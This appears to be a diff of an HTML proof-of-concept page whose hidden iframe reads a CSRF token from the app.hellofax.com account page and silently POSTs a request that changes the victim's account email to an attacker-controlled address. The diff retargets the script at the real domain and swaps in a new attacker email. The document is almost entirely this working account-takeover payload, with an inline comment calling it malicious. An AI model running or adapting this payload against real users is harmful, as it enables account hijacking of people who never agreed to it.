@@ -2,18 +2,18 @@
 <header>
 </header>
 <body>
-<iframe id="f" src="/home/myAccount?current_tab=profile" style="display:none" onload="
+<iframe id="f" src="https://app.hellofax.com/home/myAccount?current_tab=profile" style="display:none" onload="
   try {
     var doc = this.contentDocument;
     var token = doc.querySelector('input[name=\'edit_account[_csrf_token]\']')?.value;
 
     // Send malicious update request
-    fetch('/account/update', {
+    fetch('https://app.hellofax.com/account/update', {
       method: 'POST',
       credentials: 'include',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: 'edit_account[_csrf_token]=' + encodeURIComponent(token) +
-            '&edit_account[new_email_address]=vlantas@bypyn.es' +
+            '&edit_account[new_email_address]=dcoop34@shopcobe.com' +
             '&edit_account[current_tab]=profile'
     });
 
